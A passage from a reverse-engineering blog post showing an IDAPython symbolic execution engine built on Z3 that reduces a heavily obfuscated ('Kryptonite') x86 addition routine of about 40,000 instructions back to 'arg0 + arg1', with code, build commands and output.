sym = SymbolicExecutionEngine(0x804845A, 0x0804A17C)
print 'Launching the engine..'
sym.run()
print 'Done, retrieving the equation in EAX, and simplifying..'
eax = sym.get_reg_equation_simplified('eax')
print prove(eax == Sum(sym.sym_variables))
return 1
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>main()
</code></pre>

<p>```</p>

<p>Fortunately for us, it printed <em>True</em> ; so our code is correct. But it also means, the simplify function, as is at least, isn&rsquo;t able to simplify that bunch of equations involving bit-vector arithmetics. I still haven&rsquo;t found a clean way to make Z3Py simplify my big equation, so if someone knows how I can do that please contact me. I&rsquo;ve also exported the complete equation, and uploaded it <a href="/downloads/code/breaking_kryptonite_s_obfuscation_with_symbolic_execution/eq.txt">here</a> ; you are free to give it a try like this.</p>

<p>The ugly trick I came up with is just to use Z3Py&rsquo;s prove function, to try to prove that the equation is in fact an addition and if this is the case it returns the simplified equation. Again, if someone manages to simplify the previous equation without that type of trick I&rsquo;m really interested!</p>

<p>```python nasty trick</p>

<pre><code>def _simplify_additions(self, eq):
    '''The idea in this function is to help Z3 to simplify our big bitvec-arithmetic
    expression. It's simple, in eq we have a big expression with two symbolic variables (arg0 &amp; arg1)
    and a lot of bitvec arithmetic. Somehow, the simplify function is not clever enough to reduce the
    equation.

    The idea here is to use the prove function in order to see if we can simplify an equation by an addition of the
    symbolic variables.'''
    # The two expressions are equivalent ; we got a simplification!
    if prove(Sum(self.sym_variables) == eq):
        return Sum(self.sym_variables)

    return eq

def get_reg_equation_simplified(self, reg):
    eq = self.get_reg_equation(reg)
    eq = simplify(self._simplify_additions(eq))
    return eq
</code></pre>

<p>```</p>

<p>And now if you relaunch the script you will get:</p>

<p><code>text
Launching the engine..
Trying to read a non-initialized area, we got a new symbolic variable: arg0
Trying to read a non-initialized area, we got a new symbolic variable: arg1
Done, retrieving the equation in EAX, and simplifying..
EAX=arg0 + arg1
</code></p>

<p>We just successfully simplified two thousands of assembly into a simple addition, wonderful!</p>

<h1>Symbolic execution VS Kryptonite</h1>

<p>OK, now we have a working engine able to break a small program (~two thousands instructions), let&rsquo;s see if we can do the same with a kryptonized-binary. Let&rsquo;s take a simple addition like in the previous parts:</p>

<p>```c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<p>unsigned int add(unsigned int a, unsigned int b)
{</p>

<pre><code>return a + b;
</code></pre>

<p>}</p>

<p>int main(int argc, char* argv[])
{</p>

<pre><code>if(argc != 3)
    return 0;

printf("Result: %u\n", add(atoll(argv[1]), atoll(argv[2])));
return 1;
</code></pre>

<p>}
```</p>

<p>Now, time for a kryptonization:</p>

<p><code>bash
$ wget https://raw.github.com/0vercl0k/stuffz/master/llvm-funz/kryptonite/llvm-functionpass-kryptonite-obfuscater.cpp
$ clang++ llvm-functionpass-kryptonite-obfuscater.cpp `llvm-config --cxxflags --ldflags --libs core` -shared -o llvm-functionpass-kryptonite-obfuscater.so
$ clang -S -emit-llvm add.c -o add.ll
$ opt -S -load ~/dev/llvm-functionpass-kryptonite-obfuscater.so -kryptonite -heavy-add-obfu add.ll -o add.opti.ll &amp;&amp; mv add.opti.ll add.ll
$ opt -S -load ~/dev/llvm-functionpass-kryptonite-obfuscater.so -kryptonite -heavy-add-obfu add.ll -o add.opti.ll &amp;&amp; mv add.opti.ll add.ll
$ llc -O0 -filetype=obj -march=x86 add.ll -o add.o
$ clang -static add.o -o kryptonite-add
$ strip --strip-all ./kryptonite-add
</code></p>

<p>At this moment we end up with that binary: <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/kryptonite-add">kryptonite-add</a>. The target routine for our study starts at 0x804823C and ends at 0x08072284 ; roughly more than 40 thousands assembly instructions and kind of big right?</p>

<p>Here is our final IDAPython script after some minor adjustments (added one or two more instructions):</p>

<p>```python tiny_symbolic_execution_engine_z3.py <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/tiny_symbolic_execution_engine_z3.py">https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/tiny_symbolic_execution_engine_z3.py</a>
class EquationId(object):</p>

<pre><code>def __init__(self, id_):
    self.id = id_

def __repr__(self):
    return 'EID:%d' % self.id
</code></pre>

<p>class Disassembler(object):</p>

<pre><code>'''A simple class to decode easily instruction in IDA'''
def __init__(self, start, end):
    self.start = start
    self.end = end
    self.eip = start

def _decode_instr(self):
    '''Returns mnemonic, dst, src'''
    mnem = GetMnem(self.eip)
    x = []
    for i in range(2):
        ty = GetOpType(self.eip, i)
        # cst
        if 5 &lt;= ty &lt;= 7:
            x.append(GetOperandValue(self.eip, i))
        else:
            x.append(GetOpnd(self.eip, i))

    return [mnem] + x

def get_next_instruction(self):
    '''This is a convenient generator, you can iterator through
    each instructions easily'''
    while self.eip != self.end:
        yield self._decode_instr()
        self.eip += ItemSize(self.eip)
</code></pre>

<p>class SymbolicExecutionEngine(object):</p>

<pre><code>'''The symbolic execution engine is the class that will
handle the symbolic execution. It will keep a track of the 
different equations encountered, and the CPU context at each point of the program.

The symbolic variables have to be found by the user (or using data-taing). This is not
the purpose of this class.

We are lucky, we only need to handle those operations &amp; encodings:
    . mov:
        . mov reg32, reg32
        . mov reg32, [mem]
        . mov [mem], reg32
        . mov reg32, cst
    . shr:
        . shr reg32, cst
    . shl:
        . shl reg32, cst
    . and:
        . and reg32, cst
        . and reg32, reg32
    . xor:
        . xor reg32, cst
    . or:
        . or reg32, reg32
    . add:
        . add reg32, reg32
        . add reg32, cst

We also don't care about:
    . EFLAGS
    . branches
    . smaller registers (16/8 bits)
Long story short: it's perfect ; that environment makes really easy to play with symbolic execution.'''
def __init__(self, start, end):
    # This is the CPU context at each time
    # The value of the registers are index in the equations dictionnary
    self.ctx = {
        'eax' : None,
        'ebx' : None,
        'ecx' : None,
        'edx' : None,
        'esi' : None,
        'edi' : None,
        'ebp' : None,
        'esp' : None,
        'eip' : None
    }

    # The address where the symbolic execution will start
    self.start = start

    # The address where the symbolic execution will stop
    self.end = end

    # Our disassembler
    self.disass = Disassembler(start, end)

    # This is the memory that can be used by the instructions to save temporary values/results
    self.mem = {}

    # Each equation must have a unique id
    self.idx = 0

    # The symbolic variables will be stored there
    self.sym_variables = []

    # Each equation will be stored here
    self.equations = {}

    # Number of instructions emulated
    self.ninstrs = 0

def _check_if_reg32(self, r):
    '''XXX: make a decorator?'''
    return r.lower() in self.ctx

def _push_equation(self, e):
    idx = EquationId(self.idx)
    self.equations[idx] = e
    self.idx += 1
    return idx

def set_reg_with_equation(self, r, e):
    if self._check_if_reg32(r) == False:
        return

    self.ctx[r] = self._push_equation(e)

def get_reg_equation(self, r):
    if self._check_if_reg32(r) == False:
        return

    if isinstance(self.ctx[r], EquationId):
        return self.equations[self.ctx[r]]
    else:
        return self.ctx[r]

def run(self):
    '''Run from start address to end address the engine'''
    for mnemonic, dst, src in self.disass.get_next_instruction():
        if (self.ninstrs % 5000) == 0 and self.ninstrs &gt; 0:
            print '%d instructions, %d equations so far...' % (self.ninstrs, len(self.equations))

        if mnemonic == 'mov':
            # mov reg32, imm32
            if dst in self.ctx and isinstance(src, (int, long)):
                self.ctx[dst] = src
            # mov reg32, reg32
            elif src in self.ctx and dst in self.ctx:
                self.ctx[dst] = self.ctx[src]
            # mov reg32, [mem]
            elif (src.find('var_') != -1 or src.find('arg') != -1) and dst in self.ctx:
                if src not in self.mem:
                    # A non-initialized location is trying to be read, we got a symbolic variable!
                    sym = BitVec('arg%d' % len(self.sym_variables), 32)
                    self.sym_variables.append(sym)
                    print 'Trying to read a non-initialized area, we got a new symbolic variable: %s' % sym
                    self.mem[src] = self._push_equation(sym)

                self.ctx[dst] = self.mem[src]
            # mov [mem], reg32
            elif dst.find('var_') != -1 and src in self.ctx:
                self.mem[dst] = self.ctx[src]
            else:
                raise Exception('This encoding of "mov" is not handled.')
        elif mnemonic == 'shr':
            # shr reg32, cst
            if dst in self.ctx and isinstance(src, (int, long)):
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) &gt;&gt; src)
            else:
                raise Exception('This encoding of "shr" is not handled.')
        elif mnemonic == 'shl':
            # shl reg32, cst
            if dst in self.ctx and isinstance(src, (int, long)):
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) &lt;&lt; src)
            else:
                raise Exception('This encoding of "shl" is not handled.')
        elif mnemonic == 'and':
            # and reg32, cst
            if isinstance(src, (int, long)):
                x = src
            # and reg32, reg32
            elif src in self.ctx:
                x = self.get_reg_equation(src)
            else:
                raise Exception('This encoding of "and" is not handled.')

            self.set_reg_with_equation(dst, self.get_reg_equation(dst) &amp; x)
        elif mnemonic == 'xor':
            # xor reg32, cst
            if dst in self.ctx and isinstance(src, (int, long)):
                if self.ctx[dst] not in self.equations:
                    self.ctx[dst] ^= src
                else:
                    self.set_reg_with_equation(dst, self.get_reg_equation(dst) ^ src)
            else:
                raise Exception('This encoding of "xor" is not handled.')
        elif mnemonic == 'or':
            # or reg32, reg32
            if dst in self.ctx and src in self.ctx:
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) | self.get_reg_equation(src))
            else:
                raise Exception('This encoding of "or" is not handled.')
        elif mnemonic == 'add':
            # add reg32, reg32
            if dst in self.ctx and src in self.ctx:
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) + self.get_reg_equation(src))
            # add reg32, cst
            elif dst in self.ctx and isinstance(src, (int, long)):
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) + src)
            else:
                raise Exception('This encoding of "add" is not handled.')
        else:
            print mnemonic, dst, src
            raise Exception('This instruction is not handled.')

        self.ninstrs += 1

def _simplify_additions(self, eq):
    '''The idea in this function is to help Z3 to simplify our big bitvec-arithmetic
    expression. It's simple, in eq we have a big expression with two symbolic variables (arg0 &amp; arg1)
    and a lot of bitvec arithmetic. Somehow, the simplify function is not clever enough to reduce the
    equation.

    The idea here is to use the prove function in order to see if we can simplify an equation by an addition of the
    symbolic variables.'''
    # The two expressions are equivalent ; we got a simplification!
    if prove_(Sum(self.sym_variables) == eq):
        return Sum(self.sym_variables)

    return eq

def get_reg_equation_simplified(self, reg):
    eq = self.get_reg_equation(reg)
    eq = simplify(self._simplify_additions(eq))
    return eq
</code></pre>

<p>def main():</p>

<pre><code>'''Here we will try to attack the semantic-preserving obfuscations
I talked about in "Obfuscation of steel: meet my Kryptonite." : http://0vercl0k.tuxfamily.org/bl0g/?p=260.

The idea is to defeat those obfuscations using a tiny symbolic execution engine.'''
# sym = SymbolicExecutionEngine(0x804845A, 0x0804A17C) # for simple adder
sym = SymbolicExecutionEngine(0x804823C, 0x08072284) # adder kryptonized
print 'Launching the engine..'
sym.run()
print 'Done. %d equations built, %d assembly lines emulated, %d virtual memory cells used' % (len(sym.equations), sym.ninstrs, len(sym.mem))
print 'CPU state at the end:'
print sym.ctx
print 'Retrieving and simplifying the EAX register..'
eax = sym.get_reg_equation_simplified('eax')
print 'EAX=%r' % eax
return 1
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>main()
</code></pre>

<p>```</p>

<p>And here is the final output:</p>

<p><code>text
Launching the engine..
Trying to read a non-initialized area, we got a new symbolic variable: arg0
Trying to read a non-initialized area, we got a new symbolic variable: arg1
5000 instructions, 2263 equations so far...
10000 instructions, 4832 equations so far...
15000 instructions, 7228 equations so far...
20000 instructions, 9766 equations so far...
25000 instructions, 12212 equations so far...
30000 instructions, 14762 equations so far...
35000 instructions, 17255 equations so far...
40000 instructions, 19801 equations so far...
Done. 19857 equations built, 40130 assembly lines emulated, 5970 virtual memory cells used
CPU state at the end:
{'eax': EID:19856, 'ebp': None, 'eip': None, 'esp': None, 'edx': EID:19825, 'edi': EID:19796, 'ebx': EID:19797, 'esi': EID:19823, 'ecx': EID:19856}
Retrieving and simplifying the EAX register..
EAX=arg0 + arg1
</code></p>

<h1>Conclusion</h1>

<p>I hope you did enjoy this little introduction to symbolic execution, and how it can be very valuable to remove some semantic-preserving obfuscations. We also have seen that this PoC is not really elaborate: it doesn&rsquo;t handle loops or any branches, doesn&rsquo;t care about EFLAGS, etc ; but it was enough to break our two examples. I hope you also enjoyed the examples used to showcase our tiny symbolic execution engine.</p>

<p>If you want to go further with symbolic execution, here is a list of nice articles:</p>

<ul>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-1-trace-generation/">Anatomy of a Symbolic Emulator, Part 1: Trace Generation</a></li>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-2-introducing-symbolic-data/">Anatomy of a Symbolic Emulator, Part 2: Introducing Symbolic Data</a></li>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-3-processing-symbolic-data-generating-new-inputs/">Anatomy of a Symbolic Emulator, Part 3: Processing Symbolic Data &amp; Generating New Inputs</a></li>
<li><a href="http://research.microsoft.com/en-us/um/people/pg/public_psfiles/fsttcs2012.pdf">Test Generation Using Symbolic Execution</a></li>
<li><a href="http://ccadar.github.io/klee/">The KLEE Symbolic Virtual Machine</a></li>
<li><a href="http://shell-storm.org/blog/Concolic-execution-taint-analysis-with-valgrind-and-constraints-path-solver-with-z3/">Concolic execution &ndash; Taint analysis with Valgrind and constraints path solver with Z3</a></li>
<li><a href="https://sites.google.com/site/symexbib/">A Bibliography of Papers on Symbolic Execution Technique and its Applications</a></li>
</ul>


<p>PS: By the way, for those who like weird machines, I&rsquo;ve managed to code a MOV/JMP turing machine based on <a href="http://www.cl.cam.ac.uk/~sd601/papers/mov.pdf">mov is Turing-complete</a> here: <a href="https://github.com/0vercl0k/stuffz/blob/master/fun_with_mov_turing_completeness.cpp">fun_with_mov_turing_completeness.cpp</a>!</p>
]]></content>
  </entry>
  
</feed>
